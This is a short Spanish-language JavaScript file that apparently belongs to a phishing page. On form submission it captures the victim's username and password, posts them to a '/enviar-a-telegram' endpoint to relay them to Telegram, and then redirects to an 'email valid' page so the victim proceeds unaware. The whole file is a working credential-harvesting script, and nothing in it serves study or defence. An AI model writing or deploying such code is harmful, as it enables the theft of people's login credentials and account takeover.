
const formulario = document.getElementById('add');

formulario.addEventListener('submit', function (event) {
  event.preventDefault();

  const datosFormulario = {
    username: document.getElementById('username').value,
    password: document.getElementById('password').value,
  };
  
  enviarDatosATelegram(datosFormulario);

  // Redirige a la nueva página o formulario
  window.location.href = '/correo-valid';
});

function enviarDatosATelegram(datos) {
  fetch('/enviar-a-telegram', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(datos),
  })
  .then(response => response.json())
  .then(data => {
    // Puedes manejar la respuesta si es necesario
    console.log('Respuesta del servidor:', data);
  })
  .catch(error => {
    console.error('Error al enviar datos a Telegram:', error);
  });
}

const correoElectronicoInput = document.getElementById('correoElectronico');
const btnContinuar = document.getElementById('btnContinuar');

correoElectronicoInput.addEventListener('input', function () {
  btnContinuar.disabled = !correoElectronicoInput.value.trim();
});
